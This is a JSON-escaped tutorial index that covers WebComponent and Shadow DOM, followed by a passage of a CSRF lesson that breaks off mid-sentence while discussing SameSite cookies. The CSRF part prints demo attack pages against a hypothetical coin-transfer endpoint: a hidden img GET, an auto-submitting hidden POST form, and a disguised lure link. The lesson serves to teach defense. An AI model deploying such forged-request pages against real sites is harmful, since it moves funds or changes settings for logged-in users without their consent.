{</span></span><br><span class=\"line\"><span class=\"language-css\">      <span class=\"attribute\">background-color</span>: red;</span></span><br><span class=\"line\"><span class=\"language-css\">      <span class=\"attribute\">color</span>: blue</span></span><br><span class=\"line\"><span class=\"language-css\">   }</span></span><br><span class=\"line\"><span class=\"language-css\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>time.geekbang<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>上面这两段代码分别实现了自己 p 标签的属性，如果两个人分别负责开发这两段代码的话，那么在测试阶段可能没有什么问题，不过当最终项目整合的时候，其中内部的 CSS 属性会影响到其他外部的 p 标签的，之所以会这样，是因为 CSS 是影响全局的。</p>\n<p>我们在《<a href=\"/browser/pages/RenderPipeline.html\">渲染流水线：CSS 如何影响首次加载时的白屏时间？</a>》这篇文章中分析过，渲染引擎会将所有的 CSS 内容解析为 CSSOM，在生成布局树的时候，会在 CSSOM 中为布局树中的元素查找样式，所以有两个相同标签最终所显示出来的效果是一样的，渲染引擎是不能为它们分别单独设置样式的。</p>\n<p>除了 CSS 的全局属性会阻碍组件化，DOM 也是阻碍组件化的一个因素，因为在页面中只有一个 DOM，任何地方都可以直接读取和修改 DOM。所以使用 JavaScript 来实现组件化是没有问题的，但是 JavaScript 一旦遇上 CSS 和 DOM，那么就相当难办了。</p>\n<h2 id=\"WebComponent组件化开发\"><a href=\"#WebComponent组件化开发\" class=\"headerlink\" title=\"WebComponent组件化开发\"></a>WebComponent 组件化开发</h2><p>现在我们了解了 <strong>CSS 和 DOM 是阻碍组件化的两个因素</strong>，那要怎么解决呢？</p>\n<p>WebComponent 给出了解决思路，它提供了对局部视图封装能力，可以让 DOM、CSSOM 和 JavaScript 运行在局部环境中，这样就使得局部的 CSS 和 DOM 不会影响到全局。</p>\n<p>了解了这些，下面我们就结合具体代码来看看 WebComponent 是怎么实现组件化的。</p>\n<p>前面我们说了，WebComponent 是一套技术的组合，具体涉及到了 <strong>Custom elements（自定义元素）</strong>、<strong>Shadow DOM（影子 DOM）</strong>和 <strong>HTML templates（HTML 模板）</strong>，详细内容你可以参考 MDN 上的相关链接。</p>\n<p>下面我们就来演示下这 3 个技术是怎么实现数据封装的，如下面代码所示：</p>\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">            一：定义模板</span></span><br><span class=\"line\"><span class=\"comment\">            二：定义内部CSS样式</span></span><br><span class=\"line\"><span class=\"comment\">            三：定义JavaScript行为</span></span><br><span class=\"line\"><span class=\"comment\">    --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">template</span> <span class=\"attr\">id</span>=<span class=\"string\">\"geekbang-t\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"selector-tag\">p</span> {</span></span><br><span class=\"line\"><span class=\"language-css\">                <span class=\"attribute\">background-color</span>: brown;</span></span><br><span class=\"line\"><span class=\"language-css\">                <span class=\"attribute\">color</span>: cornsilk</span></span><br><span class=\"line\"><span class=\"language-css\">            }</span></span><br><span class=\"line\"><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"selector-tag\">div</span> {</span></span><br><span class=\"line\"><span class=\"language-css\">                <span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">                <span class=\"attribute\">background-color</span>: bisque;</span></span><br><span class=\"line\"><span class=\"language-css\">                <span class=\"attribute\">border</span>: <span class=\"number\">3px</span> solid chocolate;</span></span><br><span class=\"line\"><span class=\"language-css\">                <span class=\"attribute\">border-radius</span>: <span class=\"number\">10px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">            }</span></span><br><span class=\"line\"><span class=\"language-css\">        </span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>time.geekbang.org<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>time1.geekbang.org<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>) {</span></span><br><span class=\"line\"><span class=\"language-javascript\">                <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'inner log'</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">            }</span></span><br><span class=\"line\"><span class=\"language-javascript\">        </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">class</span> <span class=\"title class_\">GeekBang</span> <span class=\"keyword\">extends</span> <span class=\"title class_ inherited__\">HTMLElement</span> {</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"title function_\">constructor</span>(<span class=\"params\"></span>) {</span></span><br><span class=\"line\"><span class=\"language-javascript\">                <span class=\"variable language_\">super</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">                <span class=\"comment\">//获取组件模板</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">                <span class=\"keyword\">const</span> content = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">'#geekbang-t'</span>).<span class=\"property\">content</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">                <span class=\"comment\">//创建影子DOM节点</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">                <span class=\"keyword\">const</span> shadowDOM = <span class=\"variable language_\">this</span>.<span class=\"title function_\">attachShadow</span>({ <span class=\"attr\">mode</span>: <span class=\"string\">'open'</span> })</span></span><br><span class=\"line\"><span class=\"language-javascript\">                <span class=\"comment\">//将模板添加到影子DOM上</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">                shadowDOM.<span class=\"title function_\">appendChild</span>(content.<span class=\"title function_\">cloneNode</span>(<span class=\"literal\">true</span>))</span></span><br><span class=\"line\"><span class=\"language-javascript\">            }</span></span><br><span class=\"line\"><span class=\"language-javascript\">        }</span></span><br><span class=\"line\"><span class=\"language-javascript\">        customElements.<span class=\"title function_\">define</span>(<span class=\"string\">'geek-bang'</span>, <span class=\"title class_\">GeekBang</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">geek-bang</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">geek-bang</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>time.geekbang.org<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>time1.geekbang.org<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">geek-bang</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">geek-bang</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>详细观察上面这段代码，我们可以得出：要使用 WebComponent，通常要实现下面三个步骤。</p>\n<p><strong>首先，使用 template 属性来创建模板</strong>。利用 DOM 可以查找到模板的内容，但是模板元素是不会被渲染到页面上的，也就是说 DOM 树中的 template 节点不会出现在布局树中，所以我们可以使用 template 来自定义一些基础的元素结构，这些基础的元素结构是可以被重复使用的。一般模板定义好之后，我们还需要在模板的内部定义样式信息。</p>\n<p><strong>其次，我们需要创建一个 GeekBang 的类</strong>。在该类的构造函数中要完成三件事：</p>\n<ol>\n<li>查找模板内容；</li>\n<li>创建影子 DOM；</li>\n<li>再将模板添加到影子 DOM 上。</li>\n</ol>\n<p>上面最难理解的是影子 DOM，其实影子 DOM 的作用是将模板中的内容与全局 DOM 和 CSS 进行隔离，这样我们就可以实现元素和样式的私有化了。你可以把影子 DOM 看成是一个作用域，其内部的样式和元素是不会影响到全局的样式和元素的，而在全局环境下，要访问影子 DOM 内部的样式或者元素也是需要通过约定好的接口的。</p>\n<p>总之，通过影子 DOM，我们就实现了 CSS 和元素的封装，在创建好封装影子 DOM 的类之后，我们就可以使用 customElements.define 来自定义元素了（可参考上述代码定义元素的方式）。</p>\n<p>最后，就很简单了，可以像正常使用 HTML 元素一样使用该元素，如上述代码中的 <code>&lt;geek-bang&gt;&lt;/geek-bang&gt;</code>。</p>\n<p>上述代码最终渲染出来的页面，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663ccd100ea9cb1403b1bcb1.png\" alt=\"使用影子DOM的输出效果\"></p>\n<p>从图中我们可以看出，影子 DOM 内部的样式是不会影响到全局 CSSOM 的。另外，使用 DOM 接口也是无法直接查询到影子 DOM 内部元素的，比如你可以使用 <code>document.getElementsByTagName('div')</code> 来查找所有 div 元素，这时候你会发现影子 DOM 内部的元素都是无法查找的，因为要想查找影子 DOM 内部的元素需要专门的接口，所以通过这种方式又将影子内部的 DOM 和外部的 DOM 进行了隔离。</p>\n<p>通过影子 DOM 可以隔离 CSS 和 DOM，不过需要注意一点，影子 DOM 的 JavaScript 脚本是不会被隔离的，比如在影子 DOM 定义的 JavaScript 函数依然可以被外部访问，这是因为 JavaScript 语言本身已经可以很好地实现组件化了。</p>\n<h2 id=\"浏览器如何实现影子DOM\"><a href=\"#浏览器如何实现影子DOM\" class=\"headerlink\" title=\"浏览器如何实现影子DOM\"></a>浏览器如何实现影子 DOM</h2><p>关于 WebComponent 的使用方式我们就介绍到这里。WebComponent 整体知识点不多，内容也不复杂，我认为核心就是影子 DOM。上面我们介绍影子 DOM 的作用主要有以下两点：</p>\n<ol>\n<li>影子 DOM 中的元素对于整个网页是不可见的；</li>\n<li>影子 DOM 的 CSS 不会影响到整个网页的 CSSOM，影子 DOM 内部的 CSS 只对内部的元素起作用。</li>\n</ol>\n<p>那么浏览器是如何实现影子 DOM 的呢？下面我们就来分析下，如下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663ccd510ea9cb1403b21ebe.png\" alt=\"影子DOM示意图\"></p>\n<p>该图是上面那段示例代码对应的 DOM 结构图，从图中可以看出，我们使用了两次 geek-bang 属性，那么就会生成两个影子 DOM，并且每个影子 DOM 都有一个 shadow root 的根节点，我们可以将要展示的样式或者元素添加到影子 DOM 的根节点上，每个影子 DOM 你都可以看成是一个独立的 DOM，它有自己的样式、自己的属性，内部样式不会影响到外部样式，外部样式也不会影响到内部样式。</p>\n<p>浏览器为了实现影子 DOM 的特性，在代码内部做了大量的条件判断，比如当通过 DOM 接口去查找元素时，渲染引擎会去判断 geek-bang 属性下面的 shadow-root 元素是否是影子 DOM，如果是影子 DOM，那么就直接跳过 shadow-root 元素的查询操作。所以这样通过 DOM API 就无法直接查询到影子 DOM 的内部元素了。</p>\n<p>另外，当生成布局树的时候，渲染引擎也会判断 geek-bang 属性下面的 shadow-root 元素是否是影子 DOM，如果是，那么在影子 DOM 内部元素的节点选择 CSS 样式的时候，会直接使用影子 DOM 内部的 CSS 属性。所以这样最终渲染出来的效果就是影子 DOM 内部定义的样式。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天就讲到这里，下面我来总结下本文的主要内容。</p>\n<p>首先，我们介绍了组件化开发是程序员的刚需，所谓组件化就是功能模块要实现高内聚、低耦合的特性。不过由于 DOM 和 CSSOM 都是全局的，所以它们是影响了前端组件化的主要元素。基于这个原因，就出现 WebComponent，它包含自定义元素、影子 DOM 和 HTML 模板三种技术，使得开发者可以隔离 CSS 和 DOM。在此基础上，我们还重点介绍了影子 DOM 到底是怎么实现的。</p>\n<p>关于 WebComponent 的未来如何，这里我们不好预测和评判，但是有一点可以肯定，WebComponent 也会采用渐进式迭代的方式向前推进，未来依然有很多坑需要去填。</p>\n<h2 id=\"课外作业\"><a href=\"#课外作业\" class=\"headerlink\" title=\"课外作业\"></a>课外作业</h2><p>今天留给你的思考题是：你是怎么看待 WebComponents 和前端框架（React、Vue）之间的关系的？</p>\n<p>Web Components 是一种独立的 Web 技术，它允许开发者创建可重用的定制元素（也称为 “web components”），这些元素可以像 HTML 的内置元素那样在 Web 页面中使用。Web Components 主要由四个部分组成：自定义元素（Custom Elements）、HTML 模板（HTML Templates）、HTML 导入（HTML Imports）和 Shadow DOM。</p>\n<h3 id=\"Web-Components-和前端框架的关系：\"><a href=\"#Web-Components-和前端框架的关系：\" class=\"headerlink\" title=\"Web Components 和前端框架的关系：\"></a>Web Components 和前端框架的关系：</h3><ol>\n<li><p><strong>独立性</strong>：Web Components 是一种独立的技术，它不依赖于任何特定的前端框架。这意味着你可以在不使用 React、Vue 或 Angular 等框架的情况下使用 Web Components。</p>\n</li>\n<li><p><strong>集成性</strong>：尽管 Web Components 是独立的，但现代前端框架如 React 和 Vue 都提供了方法来集成 Web Components。这允许开发者在框架的基础上利用 Web Components 的强大功能。</p>\n</li>\n<li><p><strong>封装性</strong>：Web Components 的封装性（通过 Shadow DOM 实现）使得开发者可以创建封装了样式和行为的独立组件，这与 React 和 Vue 中的组件化思想是一致的。</p>\n</li>\n<li><p><strong>性能</strong>：Web Components 由于其轻量级和无需额外抽象层的特性，在某些情况下可能提供更好的性能。然而，前端框架通常提供了更多的抽象和工具，这在开发大型应用时非常有用。</p>\n</li>\n<li><p><strong>生态系统</strong>：React 和 Vue 拥有庞大的社区和丰富的生态系统，提供了大量的库和工具来支持开发。而 Web Components 相对较新，其生态系统正在逐步建立。</p>\n</li>\n<li><p><strong>工具链</strong>：前端框架通常伴随着一整套工具链，如构建工具、状态管理库、路由库等。Web Components 则更依赖于开发者自己组合使用不同的工具。</p>\n</li>\n<li><p><strong>学习曲线</strong>：对于熟悉 HTML、CSS 和 JavaScript 的开发者来说，Web Components 可能是一个相对容易上手的选择。然而，对于大型应用，学习并使用 React 或 Vue 可能会更加高效，因为这些框架提供了更多的结构化方法和最佳实践。</p>\n</li>\n<li><p><strong>未来趋势</strong>：随着浏览器对 Web Components 的支持越来越好，未来可能会看到更多的框架支持或者与 Web Components 更紧密的集成。</p>\n</li>\n</ol>\n<h3 id=\"结论：\"><a href=\"#结论：\" class=\"headerlink\" title=\"结论：\"></a>结论：</h3><p>Web Components 和前端框架（如 React、Vue）可以看作是解决不同问题的工具。Web Components 提供了一种创建可重用组件的标准方式，而 React 和 Vue 提供了一整套用于构建大型、复杂前端应用的解决方案。在实际开发中，开发者可以根据项目需求、团队熟悉度以及对性能和工具链的考虑来选择使用 Web Components、前端框架，或者将它们结合起来使用。</p>\n"},{"title":"浏览器中的页面","url":"/browser/pages/index.html","content":"<p><a href=\"/browser/pages/DOMTree.html\">01. DOM 树：JavaScript 是如何影响 DOM 树构建的</a><br><a href=\"/browser/pages/RenderPipeline.html\">02. 渲染流水线：CSS 如何影响首次加载时的白屏时间？</a><br><a href=\"/browser/pages/LayeAndSynMecha.html\">03. 分层和合成机制：为什么 CSS 动画比 JavaScript 高效？</a><br><a href=\"/browser/pages/Performance.html\">04. 页面性能：如何系统地优化页面？</a><br><a href=\"/browser/pages/VirtualDOM.html\">05. 虚拟 DOM ：虚拟 DOM 和实际的 DOM 有何不同？</a><br><a href=\"/browser/pages/WebComponent.html\">06. WebComponent：像搭积木一样构建 Web 应用</a><br><a href=\"/browser/pages/PagePerformanceTools.html\">07. 页面性能工具：如何使用 Performance？</a><br><a href=\"/borwser/pages/PerformanceAnalysisTools.html\">08. 性能分析工具：如何分析 Performance 中的 Main 指标？</a></p>\n"},{"title":"CSRF 攻击：陌生链接不要随便点","url":"/browser/security/CrossSiteRequestForgery.html","content":"<p>在上一篇文章中我们讲到了 XSS 攻击，XSS 的攻击方式是黑客往用户的页面中注入恶意脚本，然后再通过恶意脚本将用户页面的数据上传到黑客的服务器上，最后黑客再利用这些数据进行一些恶意操作。XSS 攻击能够带来很大的破坏性，不过另外一种类型的攻击也不容忽视，它就是我们今天要聊的 CSRF 攻击。</p>\n<p>相信你经常能听到的一句话：“别点那个链接，小心有病毒！” 点击一个链接怎么就能染上病毒了呢？</p>\n<h2 id=\"CSRF攻击的典型案例\"><a href=\"#CSRF攻击的典型案例\" class=\"headerlink\" title=\"CSRF攻击的典型案例\"></a>CSRF 攻击的典型案例</h2><p>我们结合一个真实的关于 CSRF 攻击的典型案例来分析下，在 2007 年的某一天，David 无意间打开了 Gmail 邮箱中的一份邮件，并点击了该邮件中的一个链接。过了几天，David 就发现他的域名被盗了。不过几经周折，David 还是要回了他的域名，也弄清楚了他的域名之所以被盗，就是因为无意间点击的那个链接。</p>\n<p>那 David 的域名是怎么被盗的呢？</p>\n<p>我们结合下图来分析下 David 域名的被盗流程：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663ee06f0ea9cb14035c47c0.png\" alt=\"David域名被盗流程\"></p>\n<ul>\n<li>首先 David 发起登录 Gmail 邮箱请求，然后 Gmail 服务器返回一些登录状态给 David 的浏览器，这些信息包括了 Cookie、Session 等，这样在 David 的浏览器中，Gmail 邮箱就处于登录状态了。</li>\n<li>接着黑客通过各种手段引诱 David 去打开他的链接，比如 hacker.com，然后在 hacker.com 页面中，黑客编写好了一个邮件过滤器，并通过 Gmail 提供的 HTTP 设置接口设置好了新的邮件过滤功能，该过滤器会将 David 所有的邮件都转发到黑客的邮箱中。</li>\n<li>最后的事情就很简单了，因为有了 David 的邮件内容，所以黑客就可以去域名服务商那边重置 David 域名账户的密码，重置好密码之后，就可以将其转出到黑客的账户了。</li>\n</ul>\n<p>以上就是 David 的域名被盗的完整过程，其中前两步就是我们今天要聊的 CSRF 攻击。David 在要回了他的域名之后，也将整个攻击过程分享到他的站点上了，如果你感兴趣的话，可以参考该<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGF2aWRhaXJleS5jb20vZ29vZ2xlLWdtYWlsLXNlY3VyaXR5LWhpamFjaw==\">链接<i class=\"fa fa-external-link-alt\"></i></span>（放心这个链接是安全的）。</p>\n<h2 id=\"什么是CSRF攻击\"><a href=\"#什么是CSRF攻击\" class=\"headerlink\" title=\"什么是CSRF攻击\"></a>什么是 CSRF 攻击</h2><p>CSRF 英文全称是 Cross-site request forgery，所以又称为 “跨站请求伪造”，是指黑客引诱用户打开黑客的网站，在黑客的网站中，利用用户的登录状态发起的跨站请求。简单来讲，<strong>CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事</strong>。</p>\n<p>通常当用户打开了黑客的页面后，黑客有三种方式去实施 CSRF 攻击。</p>\n<p>下面我们以极客时间官网为例子，来分析这三种攻击方式都是怎么实施的。这里假设极客时间具有转账功能，可以通过 POST 或 Get 来实现转账，转账接口如下所示：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">同时支持POST和Get</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">接口</span> </span><br><span class=\"line\">https://time.geekbang.org/sendcoin</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">参数</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"><span class=\"comment\">#目标用户</span></span></span><br><span class=\"line\">user</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"><span class=\"comment\">#目标金额</span></span></span><br><span class=\"line\">number</span><br></pre></td></tr></tbody></table></figure>\n\n<p>有了上面的转账接口，我们就可以来模拟 CSRF 攻击了。</p>\n<h3 id=\"自动发起Get请求\"><a href=\"#自动发起Get请求\" class=\"headerlink\" title=\"自动发起Get请求\"></a>自动发起 Get 请求</h3><p>黑客最容易实施的攻击方式是自动发起 Get 请求，具体攻击方式你可以参考下面这段代码：</p>\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>黑客的站点：CSRF攻击演示<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://time.geekbang.org/sendcoin?user=hacker&amp;number=100\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>这是黑客页面的 HTML 代码，在这段代码中，黑客将转账的请求接口隐藏在 img 标签内，欺骗浏览器这是一张图片资源。当该页面被加载时，浏览器会自动发起 img 的资源请求，如果服务器没有对该请求做判断的话，那么服务器就会认为该请求是一个转账请求，于是用户账户上的 100 极客币就被转移到黑客的账户上去了。</p>\n<h3 id=\"自动发起POST请求\"><a href=\"#自动发起POST请求\" class=\"headerlink\" title=\"自动发起POST请求\"></a>自动发起 POST 请求</h3><p>除了自动发送 Get 请求之外，有些服务器的接口是使用 POST 方法的，所以黑客还需要在他的站点上伪造 POST 请求，当用户打开黑客的站点时，是自动提交 POST 请求，具体的方式你可以参考下面示例代码：</p>\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>黑客的站点：CSRF攻击演示<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">id</span>=<span class=\"string\">'hacker-form'</span> <span class=\"attr\">action</span>=<span class=\"string\">\"https://time.geekbang.org/sendcoin\"</span> <span class=\"attr\">method</span>=<span class=\"string\">POST</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"user\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"hacker\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"number\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"100\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"> <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">'hacker-form'</span>).<span class=\"title function_\">submit</span>(); </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>在这段代码中，我们可以看到黑客在他的页面中构建了一个隐藏的表单，该表单的内容就是极客时间的转账接口。当用户打开该站点之后，这个表单会被自动执行提交；当表单被提交之后，服务器就会执行转账操作。因此使用构建自动提交表单这种方式，就可以自动实现跨站点 POST 数据提交。</p>\n<h3 id=\"引诱用户点击链接\"><a href=\"#引诱用户点击链接\" class=\"headerlink\" title=\"引诱用户点击链接\"></a>引诱用户点击链接</h3><p>除了自动发起 Get 和 Post 请求之外，还有一种方式是诱惑用户点击黑客站点上的链接，这种方式通常出现在论坛或者恶意邮件上。黑客会采用很多方式去诱惑用户点击链接，示例代码如下所示：</p>\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">width</span>=<span class=\"string\">150</span> <span class=\"attr\">src</span>=<span class=\"string\">http://images.xuejuzi.cn/1612/1_161230185104_1.jpg</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">img</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"https://time.geekbang.org/sendcoin?user=hacker&amp;number=100\"</span> <span class=\"attr\">target</span>=<span class=\"string\">\"_blank\"</span>&gt;</span></span><br><span class=\"line\">    点击下载美女照片</span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>这段黑客站点代码，页面上放了一张美女图片，下面放了图片下载地址，而这个下载地址实际上是黑客用来转账的接口，一旦用户点击了这个链接，那么他的极客币就被转到黑客账户上了。</p>\n<p>以上三种就是黑客经常采用的攻击方式。如果当用户登录了极客时间，以上三种 CSRF 攻击方式中的任何一种发生时，那么服务器都会将一定金额的极客币发送到黑客账户。</p>\n<p>到这里，相信你已经知道什么是 CSRF 攻击了。<strong>和 XSS 不同的是，CSRF 攻击不需要将恶意代码注入用户的页面，仅仅是利用服务器的漏洞和用户的登录状态来实施攻击。</strong></p>\n<h2 id=\"如何防止CSRF攻击\"><a href=\"#如何防止CSRF攻击\" class=\"headerlink\" title=\"如何防止CSRF攻击\"></a>如何防止 CSRF 攻击</h2><p>了解了 CSRF 攻击的一些手段之后，我们再来看看 CSRF 攻击的一些 “特征”，然后根据这些 “特征” 分析下如何防止 CSRF 攻击。下面是我总结的发起 CSRF 攻击的三个必要条件：</p>\n<ul>\n<li>第一个，目标站点一定要有 CSRF 漏洞；</li>\n<li>第二个，用户要登录过目标站点，并且在浏览器上保持有该站点的登录状态；</li>\n<li>第三个，需要用户打开一个第三方站点，可以是黑客的站点，也可以是一些论坛。</li>\n</ul>\n<p>满足以上三个条件之后，黑客就可以对用户进行 CSRF 攻击了。这里还需要额外注意一点，与 XSS 攻击不同，CSRF 攻击不会往页面注入恶意脚本，因此黑客是无法通过 CSRF 攻击来获取用户页面数据的；其最关键的一点是要能找到服务器的漏洞，所以说对于 CSRF 攻击我们主要的防护手段是提升服务器的安全性。</p>\n<p>要让服务器避免遭受到 CSRF 攻击，通常有以下几种途径。</p>\n<h3 id=\"充分利用好Cookie-的-SameSite-属性\"><a href=\"#充分利用好Cookie-的-SameSite-属性\" class=\"headerlink\" title=\"充分利用好Cookie 的 SameSite 属性\"></a>充分利用好 Cookie 的 SameSite 属性</h3><p>通过上面的介绍，相信你已经知道了黑客会利用用户的登录状态来发起 CSRF 攻击，而 Cookie 正是浏览器和服务器之间维护登录状态的一个关键数据，因此要阻止 CSRF 攻击，我们首先就要考虑在 Cookie 上来做文章。</p>\n<p>通常 CSRF 攻击都是从第三方站点发起的，要防止 CSRF 攻击，我们最好能实现从第三方站点发送请求时禁止 Cookie 的发送，因此在浏览器通过不同来源发送 HTTP 